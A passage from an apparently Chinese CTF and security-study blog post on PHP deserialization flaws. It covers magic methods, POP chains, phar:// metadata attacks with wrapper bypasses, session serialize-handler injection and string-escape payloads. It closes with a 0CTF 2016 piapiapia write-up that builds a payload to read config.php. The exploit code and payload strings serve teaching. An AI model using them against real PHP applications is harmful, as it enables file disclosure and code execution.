class="string">&#x27;触发了ivoke魔术方法&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#实例化对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="comment">#以调用函数的方式调用一个对象</span></span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;触发了ivoke魔术方法</span><br></pre></td></tr></table></figure></li><li><p>不可访问（protected 或 private）或不存在的属性</p><p>赋值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 会被调用。</p><p>读取时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。</p><p>调用 <a href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或 <a href="https://www.php.net/manual/zh/function.empty.php">empty()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> 会被调用。</p><p>调用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> 会被调用。</p></li><li><p>其他</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br></pre></td></tr></table></figure></li></ul><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>有序列化就有反序列化，漏洞点就产生于反序列化时。</p><p>因为序列化数据中存储的是类对象的属性，如果未对用户输入的序列化字符串进行检测，攻击者就可以构造恶意序列化数据，控制反序列化过程，从而<strong>覆盖变量</strong>，进而导致代码执行，SQL 注入，目录遍历等不可控后果。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol><li><p>定位序列化和反序列化代码，找到可控参数和反序列化对象</p></li><li><p>明确要利用的方法和属性</p></li><li><p>根据其所在类的魔术方法构造pop链（传入参数到触发关键函数,注意类属性的类型）</p><p>在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p></li><li><p>传递构造好的序列化内容(最好要urlencode一下)，触发反序列化，完成攻击</p></li></ol><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$flag</span>;<span class="comment">//flag in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里目的是要触发 __get() 这个函数，魔术方法__get()会在由外部访问对象中的私有属性时自动调用，其中参数伪访问属性的属性名。再观察example这个类，这里发现 __toStrong() 方法，而又存在 <code>echo $a</code> 这句，所以可以确定要构造的这个 $a 就是 example这个类的对象，而且这个对象中的属性 $flag 也应为 get 这个类的对象，从而 执行 <code>return $this-&gt;str-&gt;flag</code>时就会跳转到 get 对象的 魔术方法 __get($name) （$name为要访问的私有属性的名称，即 flag 这个属性名）。之后要 include <code>&#39;flag.php&#39;</code>，由于$name &#x3D;&#x3D; flag，所以要构造 $flag &#x3D;&#x3D; ‘.php’ ，拼接起来就可以包含 ‘flag.php’ 从而拿到flag。</p><p>即</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">example</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">get</span>(<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h1 id="phar反序列化–PHP-lt-8"><a href="#phar反序列化–PHP-lt-8" class="headerlink" title="phar反序列化–PHP&lt;8"></a>phar反序列化–PHP&lt;8</h1><h2 id="phar是什么"><a href="#phar是什么" class="headerlink" title="phar是什么"></a>phar是什么</h2><ol><li><p>功能：压缩文件，将内容序列化存储</p></li><li><p>如何生成：</p><blockquote><p>注意：要将php.ini中的phar.readonly选项设置为Off,并删除前面的;否则无法生成phar文件。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>文件格式</p><p>用010打开生成的test.phar，观察phar文件的四个组成部分</p></li></ol><p><img src="/../images/image-20220708184054295.png" alt="image-20220708184054295"></p><p>​    关注stub和manifest</p><p>​stub：phar识别标志，只要有了这个识别标志，<strong>即使后缀名不为phar，php仍能够将文件识别为phar文件</strong></p><p>​manifest：这一部分是我们可控的地方，是反序列化漏洞的关键点</p><p>​    signature：当我们需要改变phar文件内容时，需要重新生成签名</p><p>​     </p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ol><li><p>phar中manifest是用户自定义的</p></li><li><p>php一大部分的<strong>文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</strong>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#test.phar是上面生成代码生成的</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;phar://test.phar&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20220708185428364.png" alt="image-20220708185428364"></p><p>3.受到影响的函数</p><p>From <a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a></p><p><img src="/../images/image-20220714125317293.png" alt="image-20220714125317293"></p><p>​</p></li></ol><p></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ol><li><p>绕过phar开头</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure></li><li><p>绕过phar标识符<code>&lt;?php __HALT_COMPILER(); ?&gt;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip phar.phar #使用压缩后phar文件同样也能反序列化</span><br></pre></td></tr></table></figure></li><li><p>签名修改</p></li></ol><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p><a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p><h2 id="session工作流程"><a href="#session工作流程" class="headerlink" title="session工作流程"></a>session工作流程</h2><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1685604427875.png" alt="20191026142328-1fba974c-f7b9-1"></p><h2 id="session序列化"><a href="#session序列化" class="headerlink" title="session序列化"></a>session序列化</h2><p><code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的。</p><blockquote><p>通常文件名为sess_sessionid的形式，默认的引擎是php</p></blockquote><p><img src="/../images/image-20220730213222612.png" alt="image-20220730213222612"></p><h2 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h2><p>session序列化和反序列化所使用到的引擎不同</p><p>例如</p><ul><li><p>第一次请求，序列化用的引擎为php</p><p>假设要保存到session的数据为username&#x3D;khaz</p><ul><li><p>php怎么知道要保存哪些数据到session中</p><blockquote><p>通过在$_SESSION环境变量注册</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将username变量保存到session中</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>会话结束后，将$_SESSION序列化保存到session文件中。</p><p>正常保存</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>如果我们构造username&#x3D;|a:1:{s:8:”passwd”;s:4:”Khaz”;}</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>第二次请求，反序列化用的引擎为php_serialize</p><p>正常</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br><span class="line">→ <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><p>攻击</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">→ <span class="variable">$_SESSION</span>[<span class="string">&#x27;passwd&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><blockquote><p>从而我们就可以自定义$_SESSION环境变量的值</p></blockquote></li></ul><h1 id="过滤不当导致的字符串逃逸反序列"><a href="#过滤不当导致的字符串逃逸反序列" class="headerlink" title="过滤不当导致的字符串逃逸反序列"></a>过滤不当导致的字符串逃逸反序列</h1><h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>php反序列化特点</p><ul><li>以}作为结束符，在}之后的字符会被舍去</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;fdafadf&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>反序列化时会根据前面给定的长度，读取对应长度的字符串</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;&quot;&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//s:4:&quot;(a&quot;;&quot;)&quot;; 括号只是标注处字符串</span></span><br><span class="line"><span class="comment">//长度为4从第一个&quot;开始读取4个字符a&quot;;&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&quot;;&quot;&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当序列化的长度&#x2F;数量与实际不符时，反序列化会报错</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//s:4:&quot;a&quot;; 长度为4，实际字符串为a，长度为1</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a:3:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//a:3说明有三个值，实际上a=&gt;1,b=&gt;2,只有两个值</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">error  </span><br><span class="line">error</span><br></pre></td></tr></table></figure><p>当存在以下流程：序列化→过滤→反序列化</p><ul><li><p>过滤：在对可控变量进行过滤了之后，就会使得其序列化的长度与字符串长度不匹配，然后反序列化的时候就会报错，无法执行反序列化，就不会执行攻击者构造的攻击代码。但是利用前面提到的第一和第二个特性，攻击者可以分析过滤前后字符串长度的变化，构造字符串(字符串形式为被过滤字符+目标子串)来覆盖其他变量。</p></li><li><p>目标字串：</p><p><code>&quot;;+序列化后的变量+&#125;</code></p><p>例如我想要逃逸<code>$name=&#39;khaz&#39;</code>，那么目标字串为<code>&quot;;s:4:&quot;name&quot;;s:4:&quot;khaz&quot;;&#125;</code></p></li></ul><h2 id="分类和思路"><a href="#分类和思路" class="headerlink" title="分类和思路"></a>分类和思路</h2><h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路：让过滤后的字符串填充完长度，从而让后面的变量解放出来</span><br><span class="line">需要计算目标字串的长度l1和过滤后增加的长度l2</span><br><span class="line">payload:被过滤字符*(l1/l2)+目标子串</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">假设对变量<span class="variable">$a</span>进行过滤</span><br><span class="line">过滤规则：a→bb</span><br><span class="line"><span class="variable">$a</span>中的每个a在过滤后都会使字符串长度加<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">假设目标子串为：<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125; 一共31个字符</span></span><br><span class="line"><span class="string">就需要重复a31次，构造<span class="subst">$a</span>=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">这样序列化后有：</span></span><br><span class="line"><span class="string">s:62:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span></span><br><span class="line"><span class="string">此时长度对应字符：62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤后：</span></span><br><span class="line"><span class="string">s:62:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string">长度对应字符： 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">从而使s:8:&quot;password&quot;;s:6:&quot;123456&quot;;解放出来</span></span><br></pre></td></tr></table></figure><h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p><a href="http://www.zip得到源码,审计得到如下关键点/">www.zip得到源码，审计得到如下关键点</a></p><ol><li><p>flag在config.php</p></li><li><p>过滤函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用_代替\和\\</span></span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#用hacker代替array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;)</span></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>字符串逃逸：字符串变多 where：5  →  hacker：6  </p></li><li><p>反序列化点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>字符串逃逸覆盖$photo为config.php</p></li><li><p>序列化点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure></li><li><p>正则</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#11位数字</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#xxx@xxx.xxx xxx限制[_a-zA-Z0-9]</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#长度&lt;=10</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>需要绕过nickname的正则，用数组绕过即可。</p></li></ol><p>需要逃逸的变量为<code>$photo=&#39;config.php&#39;</code>，目标子串为<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，共33个字符，一个where在替换后长度加1，所以需要33个where。</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;12345678901&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;734541725@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span 